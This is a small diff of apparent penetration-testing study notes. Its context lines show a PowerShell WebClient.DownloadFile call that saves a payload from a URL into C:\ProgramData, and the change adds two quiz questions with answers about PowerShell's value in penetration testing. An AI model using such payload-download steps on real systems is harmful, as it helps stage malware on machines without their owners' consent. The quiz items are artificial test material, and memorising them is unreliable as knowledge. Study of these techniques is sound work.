@@ -183,7 +183,10 @@ PS C:\> $file = "C:\ProgramData\payload.exe"
 PS C:\> $webclient.DownloadFile ($payload_url, $file)
 
 .DownloadFile is a method.
-______________________________________________________________________________________________________________________________________________________________________
+____________________________________________________________________________________________________________________________________
+Which of the following is NOT a benefit of using PowerShell in penetration testing? > Ability to bypass network firewalls
+
+How does PowerShell contribute to the efficiency of penetration testing workflows? > By allowing for rapid development and execution of scripts
 
 
 
